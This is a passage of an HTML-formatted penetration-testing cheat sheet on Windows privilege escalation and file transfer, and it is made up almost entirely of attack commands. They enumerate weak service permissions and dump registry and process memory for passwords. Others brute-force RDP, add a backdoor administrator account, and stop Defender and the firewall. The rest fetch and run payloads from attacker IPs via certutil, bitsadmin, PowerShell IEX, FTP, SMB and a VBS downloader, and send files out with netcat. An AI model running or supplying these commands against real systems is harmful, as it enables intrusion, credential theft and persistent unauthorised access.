<span class="n">wmic</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="ss">&quot;Auto&quot;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="ss">&quot;C:\Windows\\&quot;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="ss">&quot;&quot;&quot; </span>

<span class="ss">icacs “C:\Program Files”   #Check for folder/file permissions</span>

<span class="ss">F = Full Control</span>
<span class="ss">CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.</span>
<span class="ss">OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE</span>

<span class="ss">sc qc &lt;service&gt;  #Checking for Auto start and owner of service</span>

<span class="ss">Upload malicious encoded binary in controlled folder to bypass AV  #Reverse Shell</span>

<span class="ss">sc stop &lt;service&gt; OR shutdown /r /t 0   #If user has rights and sc stop is now granted</span>


<span class="ss">accesschk:</span>
<span class="ss">-u: Suppress the errors</span>

<span class="ss">-w: Objects with write access</span>

<span class="ss">-c: Display service name</span>

<span class="ss">-q: Omit Banner</span>

<span class="ss">-v: Verbose</span>
<span class="ss">accesschk.exe -uwcqv &quot;</span><span class="n">Authenticated</span><span class="w"> </span><span class="n">Users</span><span class="ss">&quot; * /accepteula</span>
<span class="ss">accesschk64.exe -uwcqv %USERNAME% * /accepteula</span>
<span class="ss">accesschk.exe -uwcqv &quot;</span><span class="n">BUILTIN</span><span class="err">\</span><span class="n">Users</span><span class="err">&quot;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">/</span><span class="n">accepteula</span>

<span class="n">netsh</span><span class="w"> </span><span class="n">firewall</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="k">state</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">firewall</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">config</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">advfirewall</span><span class="w"> </span><span class="n">firewall</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="k">rule</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="ow">all</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">advfirewall</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">currentprofile</span>

<span class="err">#</span><span class="w"> </span><span class="k">Set</span><span class="w"> </span><span class="k">path</span>
<span class="k">set</span><span class="w"> </span><span class="k">PATH</span><span class="o">=%</span><span class="k">PATH</span><span class="o">%</span><span class="p">;</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">xampp</span><span class="err">\</span><span class="n">php</span>

<span class="n">whoami</span><span class="w"> </span><span class="o">/</span><span class="n">priv</span>

<span class="n">dir</span><span class="o">/</span><span class="n">a</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Show</span><span class="w"> </span><span class="n">hidden</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">unhidden</span><span class="w"> </span><span class="n">files</span>
<span class="n">dir</span><span class="w"> </span><span class="o">/</span><span class="n">Q</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">Show</span><span class="w"> </span><span class="nf">permissions</span>
<span class="n">dir</span><span class="w"> </span><span class="o">[</span><span class="n">filename</span><span class="o">]</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">p</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">directories</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="n">pause</span><span class="w"> </span><span class="n">results</span><span class="p">)</span>

<span class="err">#</span><span class="w"> </span><span class="n">Insecure</span><span class="w"> </span><span class="n">Folder</span><span class="w"> </span><span class="n">Permission</span>
<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="n">cacls</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">bd</span>

<span class="err">#</span><span class="w"> </span><span class="n">Insecure</span><span class="w"> </span><span class="k">File</span><span class="o">/</span><span class="n">Service</span><span class="w"> </span><span class="n">Permission</span>
<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="n">cacls</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">bd</span><span class="err">\</span><span class="n">bd</span><span class="p">.</span><span class="n">exe</span>

<span class="n">#Service</span><span class="w"> </span><span class="n">Query</span>
<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span><span class="n">sc</span><span class="w"> </span><span class="n">qc</span><span class="w"> </span><span class="n">bd</span>
</code></pre></div>

<h3>Kernel exploits</h3>
<div class="highlight"><pre><span></span><code>#<span class="w"> </span><span class="nv">Look</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">hotfixes</span>
<span class="nv">systeminfo</span><span class="w"> </span>#<span class="w"> </span><span class="nv">Copy</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">txt</span><span class="w"> </span><span class="nv">file</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">run</span><span class="w"> </span><span class="nv">wes</span>.<span class="nv">py</span>

<span class="nv">sudo</span><span class="w"> </span><span class="nv">python</span><span class="w"> </span><span class="nv">wes</span>.<span class="nv">py</span><span class="w"> </span><span class="nv">sysinfo</span>.<span class="nv">txt</span><span class="w"> </span><span class="o">-</span><span class="nv">i</span><span class="w"> </span><span class="s2">&quot;Elevation of Privilege&quot;</span>

<span class="nv">wmic</span><span class="w"> </span><span class="nv">qfe</span><span class="w"> </span><span class="nv">list</span><span class="w"> </span>#<span class="w"> </span><span class="nv">Install</span><span class="w"> </span><span class="nv">date</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">hotfixes</span>

<span class="nv">wmic</span><span class="w"> </span><span class="nv">qfe</span><span class="w"> </span><span class="nv">get</span><span class="w"> </span><span class="nv">Caption</span>,<span class="nv">Description</span>,<span class="nv">HotFixID</span>,<span class="nv">InstalledOn</span>

#<span class="w"> </span><span class="nv">Search</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">exploits</span>
<span class="nv">site</span>:<span class="nv">exploit</span><span class="o">-</span><span class="nv">db</span>.<span class="nv">com</span><span class="w"> </span><span class="nv">windows</span><span class="w"> </span><span class="nv">XX</span><span class="w"> </span><span class="nv">XX</span>
</code></pre></div>

<h3>Cleartext passwords</h3>
<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">autologin</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>

<span class="p">#</span><span class="w"> </span><span class="n">VNC</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span>

<span class="p">#</span><span class="w"> </span><span class="n">SNMP</span><span class="w"> </span><span class="n">Parameters</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span>

<span class="p">#</span><span class="w"> </span><span class="n">Putty</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="s">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span>

<span class="p">#</span><span class="w"> </span><span class="n">Search</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">registry</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKLM</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">s</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKCU</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">s</span>

<span class="p">#</span><span class="n">Runas</span><span class="w"> </span><span class="n">CMD</span>
<span class="n">cmdkey</span><span class="w"> </span><span class="o">/</span><span class="n">list</span>

<span class="n">runas</span><span class="w"> </span><span class="o">/</span><span class="n">savecred</span><span class="w"> </span><span class="o">/</span><span class="nl">user:</span><span class="n">admin</span>
<span class="n">runas</span><span class="w"> </span><span class="o">/</span><span class="nl">user:</span><span class="n">DVR4\administrator</span><span class="w"> </span><span class="s">&quot;C:\Windows\System32\cmd.exe /c C:\Users</span><span class="se">\v</span><span class="s">iewer</span><span class="se">\r</span><span class="s">ev.exe&quot;</span>
</code></pre></div>

<h3>Reconfigure service parameters</h3>
<ul>
<li>
<p>Unquoted service paths</p>
</li>
<li>
<p>Weak service permissions</p>
</li>
</ul>
<p>https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</p>
<h3>Dump process for passwords</h3>
<div class="highlight"><pre><span></span><code><span class="c"># Looking for Firefox</span>
<span class="nb">Get-Process</span>
<span class="p">./</span><span class="n">procdump64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ma</span> <span class="nv">$PID</span><span class="n">-FF</span>
<span class="nb">Select-String</span> <span class="n">-Path</span> <span class="p">.\*.</span><span class="n">dmp</span> <span class="n">-Pattern</span> <span class="s1">&#39;password&#39;</span> <span class="p">&gt;</span> <span class="n">1</span><span class="p">.</span><span class="n">txt</span>
<span class="nb">type </span><span class="n">1</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;admin&quot;</span>
</code></pre></div>

<h3>Inside service</h3>
<p>Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.</p>
<div class="highlight"><pre><span></span><code><span class="gh">#</span> Meterpreter
run get_local_subnets

netstat /a
netstat -ano
</code></pre></div>

<h3>Programs running as Admin/system</h3>
<h3>Installed software</h3>
<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">Metasploit</span>
<span class="n">ps</span>

<span class="n">tasklist</span><span class="w"> </span><span class="o">/</span><span class="n">SVC</span>
<span class="n">net</span><span class="w"> </span><span class="n">start</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKEY_LOCAL_MACHINE\SOFTWARE</span>
<span class="n">DRIVERQUERY</span>

<span class="n">Look</span><span class="w"> </span><span class="nl">in:</span>
<span class="nl">C:</span><span class="n">\Program</span><span class="w"> </span><span class="n">files</span>
<span class="nl">C:</span><span class="n">\Program</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="p">(</span><span class="n">x86</span><span class="p">)</span>
<span class="n">Home</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span>
</code></pre></div>

<h3>Scheduled tasks</h3>
<div class="highlight"><pre><span></span><code>schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
</code></pre></div>

<h3>Weak passwords</h3>
<p>Remote desktop</p>
<div class="highlight"><pre><span></span><code>ncrack -vv --user george -P /home/kali/rockyou.txt rdp://10.11.1.111
</code></pre></div>

<h3>Add user and enable RDP</h3>
<div class="highlight"><pre><span></span><code><span class="p">#</span><span class="w"> </span><span class="n">Add</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">user</span>

<span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">haxxor</span><span class="w"> </span><span class="n">Haxxor123</span><span class="w"> </span><span class="o">/</span><span class="n">add</span>
<span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="n">Administrators</span><span class="w"> </span><span class="n">haxxor</span><span class="w"> </span><span class="o">/</span><span class="n">add</span>
<span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="s">&quot;Remote Desktop Users&quot;</span><span class="w"> </span><span class="n">haxxor</span><span class="w"> </span><span class="o">/</span><span class="n">ADD</span>

<span class="p">#</span><span class="w"> </span><span class="n">Turn</span><span class="w"> </span><span class="n">firewall</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">RDP</span>

<span class="n">sc</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="n">WinDefend</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">advfirewall</span><span class="w"> </span><span class="n">show</span><span class="w"> </span><span class="n">allprofiles</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">advfirewall</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">allprofiles</span><span class="w"> </span><span class="n">state</span><span class="w"> </span><span class="n">off</span>
<span class="n">netsh</span><span class="w"> </span><span class="n">firewall</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">opmode</span><span class="w"> </span><span class="k">disable</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="s">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">fDenyTSConnections</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_DWORD</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="mh">0</span><span class="w"> </span><span class="o">/</span><span class="n">f</span>
<span class="kt">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="s">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">UserAuthentication</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_DWORD</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="mh">0</span><span class="w"> </span><span class="o">/</span><span class="n">f</span>
</code></pre></div>

<h3>Powershell sudo for Windows</h3>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="nx">pw</span><span class="p">=</span><span class="w"> </span><span class="nx">convertto</span><span class="o">-</span><span class="nx">securestring</span><span class="w"> </span><span class="s">&quot;EnterPasswordHere&quot;</span><span class="w"> </span><span class="o">-</span><span class="nx">asplaintext</span><span class="w"> </span><span class="o">-</span><span class="nx">force</span>
<span class="err">$</span><span class="nx">pp</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">new</span><span class="o">-</span><span class="nx">object</span><span class="w"> </span><span class="o">-</span><span class="nx">typename</span><span class="w"> </span><span class="nx">System</span><span class="p">.</span><span class="nx">Management</span><span class="p">.</span><span class="nx">Automation</span><span class="p">.</span><span class="nx">PSCredential</span><span class="w"> </span><span class="o">-</span><span class="nx">argumentlist</span><span class="w"> </span><span class="s">&quot;EnterDomainName\EnterUserName&quot;</span><span class="p">,</span><span class="err">$</span><span class="nx">pw</span>
<span class="err">$</span><span class="nx">script</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;C:\Users\EnterUserName\AppData\Local\Temp\test.bat&quot;</span>
<span class="nx">Start</span><span class="o">-</span><span class="nx">Process</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="o">-</span><span class="nx">Credential</span><span class="w"> </span><span class="err">$</span><span class="nx">pp</span><span class="w"> </span><span class="o">-</span><span class="nx">ArgumentList</span><span class="w"> </span><span class="err">&#39;</span><span class="o">-</span><span class="nx">noprofile</span><span class="w"> </span><span class="o">-</span><span class="nx">command</span><span class="w"> </span><span class="o">&amp;</span><span class="p">{</span><span class="nx">Start</span><span class="o">-</span><span class="nx">Process</span><span class="w"> </span><span class="err">$</span><span class="nx">script</span><span class="w"> </span><span class="o">-</span><span class="nx">verb</span><span class="w"> </span><span class="nx">Runas</span><span class="p">}</span><span class="err">&#39;</span>

<span class="nx">powershell</span><span class="w"> </span><span class="o">-</span><span class="nx">ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="o">-</span><span class="nx">File</span><span class="w"> </span><span class="nx">xyz</span><span class="p">.</span><span class="nx">ps1</span>
</code></pre></div>

<h3>Windows download with bitsadmin</h3>
<div class="highlight"><pre><span></span><code><span class="n">bitsadmin</span><span class="w"> </span><span class="o">/</span><span class="n">transfer</span><span class="w"> </span><span class="n">mydownloadjob</span><span class="w"> </span><span class="o">/</span><span class="n">download</span><span class="w"> </span><span class="o">/</span><span class="n">priority</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">attacker10</span><span class="o">.</span><span class="mf">11.1</span><span class="o">.</span><span class="mi">111</span><span class="o">&gt;/</span><span class="n">xyz</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\\<span class="n">Users</span>\\<span class="o">%</span><span class="n">USERNAME</span><span class="o">%</span>\\<span class="n">AppData</span>\\<span class="n">local</span>\\<span class="n">temp</span>\\<span class="n">xyz</span><span class="o">.</span><span class="n">exe</span>
</code></pre></div>

<h3>Windows download with certutil.exe</h3>
<div class="highlight"><pre><span></span><code>certutil.exe -urlcache -split -f &quot;http://10.11.1.111/Powerless.bat&quot; Powerless.bat
</code></pre></div>

<h3>Windows download with powershell</h3>
<div class="highlight"><pre><span></span><code><span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s2">&quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.11.1.111/file.exe&#39;,&#39;C:\Users\Public</span><span class="se">\f</span><span class="s2">ile.exe&#39;)&quot;</span>

<span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">System</span><span class="o">.</span><span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s2">&quot;http://10.11.1.111/CLSID.list&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Users\Public\CLSID.list&quot;</span><span class="p">)</span>
</code></pre></div>

<h3>PowerShell Priv Esc</h3>
<div class="highlight"><pre><span></span><code><span class="n">powershell</span><span class="w"> </span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;https://192.168.49.221/jaws-enum.ps1&#39;</span><span class="p">)</span>
<span class="n">powershell</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">AllChecks</span>

<span class="n">powershell</span><span class="w"> </span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">Net</span><span class="o">.</span><span class="n">WebClient</span><span class="p">)</span><span class="o">.</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;https://192.168.49.221/Jaws.ps1&#39;</span><span class="p">)</span>
<span class="n">powershell</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">ExecutionPolicy</span><span class="w"> </span><span class="n">Bypass</span><span class="w"> </span><span class="o">-</span><span class="n">File</span><span class="w"> </span><span class="o">.</span>\<span class="n">jaws</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">ps1</span><span class="w"> </span><span class="o">-</span><span class="n">OutputFilename</span><span class="w"> </span><span class="n">EnumOutput</span><span class="o">.</span><span class="n">txt</span>
</code></pre></div>

<h3>Windows Download from FTP</h3>
<div class="highlight"><pre><span></span><code># In reverse shell
echo open 10.11.1.111 &gt; ftp.txt
echo USER anonymous &gt;&gt; ftp.txt
echo ftp &gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo GET file &gt;&gt; ftp.txt
echo bye &gt;&gt; ftp.txt

# Execute
ftp -v -n -s:ftp.txt
</code></pre></div>

<h3>Windows NC File Transfer</h3>
<div class="highlight"><pre><span></span><code>nc.exe -vn 192.168.119.131 8080 &lt; win_rev.doc #From windows machine
nc -lvnp 8080 &gt; win_rev.doc   #To kali box
</code></pre></div>

<h3>Windows create SMB Server transfer files</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Attack machine</span>
python3<span class="w"> </span>/usr/share/impacket/impacket/examples/smbserver.py<span class="w"> </span>Lab<span class="w"> </span><span class="s2">&quot;/root/labs/public/10.11.1.111&quot;</span>

<span class="w">    </span><span class="c1"># Or SMB service</span>
<span class="w">    </span><span class="c1"># http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</span>
<span class="w">    </span>vim<span class="w"> </span>/etc/samba/smb.conf
<span class="w">        </span><span class="o">[</span>global<span class="o">]</span>
<span class="w">        </span><span class="nv">workgroup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>WORKGROUP
<span class="w">        </span>server<span class="w"> </span><span class="nv">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Samba<span class="w"> </span>Server<span class="w"> </span>%v
<span class="w">        </span>netbios<span class="w"> </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>indishell-lab
<span class="w">        </span><span class="nv">security</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>user
<span class="w">        </span>map<span class="w"> </span>to<span class="w"> </span><span class="nv">guest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bad<span class="w"> </span>user
<span class="w">        </span>name<span class="w"> </span>resolve<span class="w"> </span><span class="nv">order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bcast<span class="w"> </span>host
<span class="w">        </span>dns<span class="w"> </span><span class="nv">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no
<span class="w">        </span><span class="nb">bind</span><span class="w"> </span>interfaces<span class="w"> </span><span class="nv">only</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yes

<span class="w">        </span><span class="o">[</span>ica<span class="o">]</span>
<span class="w">        </span><span class="nv">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/var/www/html/pub
<span class="w">        </span><span class="nv">writable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no
<span class="w">        </span>guest<span class="w"> </span><span class="nv">ok</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yes
<span class="w">        </span>guest<span class="w"> </span><span class="nv">only</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yes
<span class="w">        </span><span class="nb">read</span><span class="w"> </span><span class="nv">only</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>yes
<span class="w">        </span>directory<span class="w"> </span><span class="nv">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0555</span>
<span class="w">        </span>force<span class="w"> </span><span class="nv">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>nobody

<span class="w">    </span>chmod<span class="w"> </span>-R<span class="w"> </span><span class="m">777</span><span class="w"> </span>smb_path
<span class="w">    </span>chown<span class="w"> </span>-R<span class="w"> </span>nobody:nobody<span class="w"> </span>smb_path
<span class="w">    </span>service<span class="w"> </span>smbd<span class="w"> </span>restart

<span class="c1"># Victim machine with reverse shell</span>
Download:<span class="w"> </span>copy<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.11.1.111<span class="se">\L</span>ab<span class="se">\w</span>ce.exe<span class="w"> </span>.
Upload:<span class="w"> </span>copy<span class="w"> </span>wtf.jpg<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.11.1.111<span class="se">\L</span>ab
</code></pre></div>

<h3>Windows download with VBS</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># In reverse shell</span>
<span class="n">echo</span><span class="w"> </span><span class="n">strUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript</span><span class="o">.</span><span class="n">Arguments</span><span class="o">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">StrFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript</span><span class="o">.</span><span class="n">Arguments</span><span class="o">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Const</span><span class="w"> </span><span class="n">HTTPREQUEST_PROXYSETTING_DEFAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Const</span><span class="w"> </span><span class="n">HTTPREQUEST_PROXYSETTING_PRECONFIG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Const</span><span class="w"> </span><span class="n">HTTPREQUEST_PROXYSETTING_DIRECT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Const</span><span class="w"> </span><span class="n">HTTPREQUEST_PROXYSETTING_PROXY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Dim</span><span class="w"> </span><span class="n">http</span><span class="p">,</span><span class="n">varByteArray</span><span class="p">,</span><span class="n">strData</span><span class="p">,</span><span class="n">strBuffer</span><span class="p">,</span><span class="n">lngCounter</span><span class="p">,</span><span class="n">fs</span><span class="p">,</span><span class="n">ts</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Err</span><span class="o">.</span><span class="n">Clear</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
<span class="n">echo</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">Is</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="n">Then</span><span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;WinHttp.WinHttpRequest&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">wget</span><span class="o">.</span><span class="n">vbs</span>
